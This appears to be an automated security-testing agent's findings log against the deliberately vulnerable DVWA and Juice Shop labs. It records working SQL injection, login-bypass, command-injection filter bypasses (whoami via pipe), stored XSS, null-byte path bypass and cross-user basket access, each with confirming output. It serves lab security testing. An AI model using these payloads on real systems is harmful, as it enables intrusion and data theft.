state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: [security=high] SQLi high RENDER endpoint (distinct from low/medium instances). At high security this page has NO inline form (observed: only 'Click here to change your ID' popup link, forms=[]). It renders results from the `id` value previously stored in the session via session-input.php. Verification flow: (1) POST id to /vulnerabilities/sqli/session-input.php, (2) GET /vulnerabilities/sqli/ and read First name/Surname output. TRUE payload id=1' OR '1'='1' # returns multiple seeded surnames; FALSE id=1' AND '1'='2' # returns zero. Needs trailing # comment because query appends LIMIT 1.

[security=high] OS Command Injection high (distinct instance from low/medium). Observed POST form with fields ip (text) + Submit (submit, value=Submit) on /vulnerabilities/exec/ with footer 'Security Level: high'. High blacklist strips '; ', '| ' (pipe followed by space), and '&&'. Bypass is a pipe with NO trailing space. Payload hint: ip=127.0.0.1|whoami  — confirmed ONLY if response output contains web-process identity 'www-data'.

[security=low] POST guestbook form action=/vulnerabilities/xss_s/. Fields: txtName (text, maxlength=10), mtxMessage (textarea, maxlength=50), submit btnSign='Sign Guestbook'. Also btnClear='Clear Guestbook'. No CSRF token. Canary '<script id="test_token">window.xss_flag=1</script>' is 50 chars (==maxlength, client-side only). Verify via browser_navigate + browser_eval_js(window.xss_flag). pending_verification.

Security-level control. POST security=<low|medium|high>, seclev_submit=Submit, user_token (hidden, observed value cae8db2e21cc363fdc265d30fd4a4031). Current level=low. Used to pivot to medium/high instances later.
BOLA target: request acct1's basket (id=6) authenticated as acct2. Confirm cross-user retrieval by presence of acct1's distinct seeded item 'Apple Juice (1000ml)' quantity 3 (BasketId 6, UserId 22).
Open directory listing (serve-index). HTTP 200 lists acquisitions.md, package.json.bak, coupons_2013.md.bak, legal.md, etc. Accept: text/html,application/json.
HTTP 200 text/markdown. Confidential memo: '# Planned Acquisitions ... This document is confidential! Do not distribute! Our company plans to acquire several competitors within the next year.'
JSON body {email,password}. Bad creds -> HTTP 401 'Invalid email or password.' Auth-bypass SQLi target: email=' OR 1=1-- yields admin@juice-sh.op token.
q=test returns HTTP 200 JSON product list. SQLi target: qwert' -> 500 SQLITE_ERROR; x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- -> 200.
Unauthenticated HTTP 200 returns feedback records with partially masked but disclosed author emails embedded in comments (e.g. '***in@juice-sh.op', '***ereum@juice-sh.op'). PII exposure.
Raw path returns HTTP 403 'Only .md and .pdf files are allowed!' (fileServer.js verify filter).

Poison null-byte bypass: appending %2500.md returns HTTP 200 application/octet-stream with restricted package.json.bak contents (juice-shop package.json, version 6.2.0-SNAPSHOT). Contrast with 403 on raw .bak path.
Browsable directory HTTP 200 exposing sensitive key files: jwt.pub (248 bytes) and premium.key (50 bytes).

[security=medium] SQLi at medium: id field is now a <select> dropdown submitted via POST (was GET at low); quotes server-side escaped so use NUMERIC boolean bypass: id=1 OR 1=1 (TRUE, multiple surnames) vs id=1 AND 1=2 (FALSE, zero records). Form action POST /vulnerabilities/sqli/ with fields id + Submit=Submit. No user_token on this form.

[security=high] SQLi high out-of-band injection point. Observed POST form with fields id (text) + Submit (submit, value=Submit). This endpoint stores the attacker-controlled `id` into the session. High-level query appends LIMIT 1, so a trailing comment is required. Payload hint: id=1' OR '1'='1' #  (TRUE => multiple seeded surnames) vs id=1' AND '1'='2' #  (FALSE => zero records); or UNION leak of users.password. After submitting here, load GET /vulnerabilities/sqli/ to render results. Security level set to high confirmed via /security.php footer 'Security Level: high'.

findings.title: SQL Injection in id parameter (DVWA sqli, low)
findings.response_evidence: [security=low] TRUE payload (1' OR '1'='1) returned multiple seeded user records with surnames: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (5 rows). FALSE payload (1' AND '1'='2) returned zero records ("User ID:" with no First name/Surname output). Boolean-based SQLi confirmed via differential record counts.

findings.title: OS Command Injection in ip parameter (DVWA exec, low)
findings.response_evidence: [security=low] POST ip=127.0.0.1; whoami returned the ping output followed by the injected command result. pre block ends with "www-data", proving the appended `whoami` executed as the web process identity. Command injection confirmed.

On rendering the guestbook page in the authenticated browser, the injected element persisted: document.getElementById('test_token').outerHTML === '<script id="test_token">window.xss_flag=1</script>'. Stored script executed: window.xss_flag evaluated to 1 in browser context.

findings.title: Cross-User Basket Access / BOLA on /rest/basket/{id}
request_sequence: GET /rest/basket/6 as juiceshop_acct1 -> own_basket_id=6, UserId=22, Products: Apple Juice (1000ml) qty 3
GET /rest/basket/6 as juiceshop_acct2 (own_basket_id=7) -> HTTP 200 returns acct1's basket
findings.response_evidence: Acct1 (acct1_bench@juiceshop.local, own_basket_id=6) basket 6 UserId=22 contains distinct seeded item 'Apple Juice (1000ml)' BasketItem quantity 3. Authenticated as acct2 (acct2_bench@juiceshop.local, own_basket_id=7), GET /rest/basket/6 returned HTTP 200 with the SAME data: {"id":6,"UserId":22,"Products":[{"name":"Apple Juice (1000ml)",...,"BasketItem":{"BasketId":6,"quantity":3}}]}. Acct2 retrieved acct1's basket item cross-user — BOLA confirmed.

findings.title: Login Authentication-Bypass SQL Injection on POST /rest/user/login
findings.response_evidence: HTTP 200 returned a valid auth token for the first user: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. The injected email `' OR 1=1--` bypassed authentication and logged in as admin@juice-sh.op (first user). SQLi auth-bypass confirmed.

findings.title: Product-Search SQL Injection on GET /rest/products/search
request_sequence: GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- (unauth) -> HTTP 200 UNION reflected
findings.response_evidence: q=`qwert'` returned HTTP 500 with body: "Error: SQLITE_ERROR: near \"'%'\": syntax error OWASP Juice Shop (Express ^4.17.1)" proving unsanitized query. The 9-column UNION q=`x')) UNION SELECT 1,2,3,4,5,6,7,8,9--` returned HTTP 200 with injected literals reflected: {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — column count matched and arbitrary SELECT values appear in output. SQLi confirmed.

findings.title: Confidential Document Disclosure via Open Directory Listing (/ftp/acquisitions.md)
findings.response_evidence:
Step 1: GET /ftp/ (HTTP 200, unauth) returns a browsable directory listing enumerating 'acquisitions.md 909 12/19/2023 1:12:12 PM' among other files. Step 2: GET /ftp/acquisitions.md (HTTP 200, text/markdown, no auth) returns the confidential memo verbatim: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...' Both conditions met: listing reveals the document and direct retrieval returns the confidential text.

findings.title: Unauthenticated User-Feedback PII Exposure (/api/Feedbacks)
findings.response_evidence: HTTP 200 application/json returned WITHOUT authentication (unauth session, no Authorization header). Response {\"status\":\"success\",\"data\":[...]} discloses author email addresses embedded in comment text, e.g. id=1 '...(***in@juice-sh.op)', id=3 '...(***der@juice-sh.op)', and id=4 '...(***ereum@juice-sh.op)'. Author UserIds (1,2,3,21) are also leaked. PII (email domains juice-sh.op) exposed to anonymous callers.

findings.title: Exposed Encryption-Keys Directory Listing (/encryptionkeys/)
findings.response_evidence: HTTP 200 text/html (unauth) returns a browsable directory index: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. The listing exposes sensitive key files jwt.pub (248 bytes, JWT public key) and premium.key (50 bytes) with direct links. Directory browsing of secret material confirmed.

findings.title: Poison Null-Byte Path Traversal bypasses /ftp extension filter to disclose restricted package.json.bak
findings.response_evidence:
NEGATIVE CONTROL (raw .bak blocked): GET /ftp/package.json.bak returned HTTP 403 with denial message "Error: Only .md and .pdf files are allowed!" thrown at verify (/juice-shop/build/routes/fileServer.js:55:18), confirming the extension allow-list filter is enforced on the raw path.

BYPASS (null-byte): GET /ftp/package.json.bak%2500.md returned HTTP 200, Content-Type application/octet-stream, delivering the restricted backup file contents verbatim. The URL-encoded null byte (%2500) truncates the filename before the filter sees the real .bak extension while the appended .md satisfies the allow-list. Distinctive retrieved content excerpt: {"name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", "homepage": "http://owasp-juice.shop", "author": "Björn Kimminich ..."}. Full dependency manifest (express, sequelize, sqlite3, jsonwebtoken, etc.) was also disclosed. The 403-vs-200 contrast on the same underlying file proves the poison null-byte path traversal bypass.

findings.title: SQL Injection (numeric boolean bypass) at DVWA medium security - /vulnerabilities/sqli/
request_sequence: POST /security.php (security=medium, seclev_submit=Submit, user_token=[REDACTED] -> Security level set to medium
findings.response_evidence: [security=medium] At medium the id field is a POST parameter with quotes server-side escaped (mysql_real_escape_string), so a quoted injection fails and a NUMERIC boolean bypass is required - distinct from the low-level GET/quoted instance. TRUE payload id=1 OR 1=1 returned MULTIPLE seeded user surnames (5 records): "admin", Gordon "Brown", Hack "Me", Pablo "Picasso", Bob "Smith". FALSE payload id=1 AND 1=2 returned ZERO records (no First name/Surname blocks rendered). The boolean differential confirms SQL injection. pre_blocks TRUE: ["ID: 1 OR 1=1 First name: admin Surname: admin", "...Gordon Brown", "...Hack Me", "...Pablo Picasso", "...Bob Smith"]; FALSE: none. Security Level: medium confirmed in page footer.

findings.title: OS Command Injection (pipe bypass) at DVWA medium security - /vulnerabilities/exec/
request_sequence: POST /security.php (security=medium, seclev_submit=Submit, user_token=[REDACTED] -> Security level set to medium
findings.response_evidence: [security=medium] At medium security the ';' and '&&' separators are blacklisted server-side (str_replace), defeating the low-level ';' payload - distinct instance. Bypass using pipe payload ip=127.0.0.1| whoami succeeds. Response output (pre_blocks) contains the web-process identity "www-data", proving command execution as the web user. Security Level: medium confirmed in page footer.

findings.title: SQL Injection (HIGH security, out-of-band session-input) in DVWA sqli id parameter
request_sequence: POST /vulnerabilities/sqli/session-input.php (session=dvwa_admin) body: id=1' OR '1'='1' # & Submit=Submit  -> stores TRUE payload in session
GET /vulnerabilities/sqli/ (session=dvwa_admin) -> renders 5 seeded user records (surnames: admin, Brown, Me, Picasso, Smith)
POST /vulnerabilities/sqli/session-input.php (session=dvwa_admin) body: id=1' AND '1'='2' # & Submit=Submit -> stores FALSE payload in session
findings.response_evidence: [security=high] Footer confirms 'Security Level: high'. At HIGH, the id is injected out-of-band via session-input.php and the backend query appends LIMIT 1, requiring a trailing '#' comment to neutralize it. TRUE payload id=1' OR '1'='1' # returned MULTIPLE seeded surnames: admin, Brown, Me, Picasso, Smith. FALSE payload id=1' AND '1'='2' # returned ZERO records (GET /vulnerabilities/sqli/ visible_text contained no First name/Surname output, only the 'Click here to change your ID' link). The boolean differential (5 rows vs 0 rows) proves SQL injection. Distinct instance from low/medium (HIGH-specific trailing-comment bypass with LIMIT 1).

findings.title: SQL Injection (HIGH security, render endpoint) reflects injected session value in DVWA
request_sequence: GET /vulnerabilities/sqli/ (dvwa_admin) -> renders 5 surnames (admin, Brown, Me, Picasso, Smith)
findings.response_evidence: [security=high] This GET endpoint is the HIGH-level READ/RENDER side (no inline form, forms=[]; only 'Click here to change your ID' popup). It renders the injected `id` previously stored in the session by session-input.php. With TRUE session value it reflected 5 seeded user records (surnames admin, Brown, Me, Picasso, Smith); with FALSE session value it reflected ZERO records. This confirms the GET load faithfully reflects/executes the injected session value — the boolean differential is observable only through this render endpoint. Security Level: high confirmed via footer.

findings.title: OS Command Injection (HIGH security) in DVWA exec ip parameter
findings.response_evidence: [security=high] Footer confirms 'Security Level: high'. HIGH blacklist strips '; ', '| ' (pipe+space), and '&&'. Bypass used a pipe with NO trailing space: ip=127.0.0.1|whoami. The response pre_blocks returned ["www-data"] and visible_text contained 'www-data', proving arbitrary OS command execution as the web-process identity. Distinct instance from low/medium (HIGH-specific no-trailing-space pipe bypass).
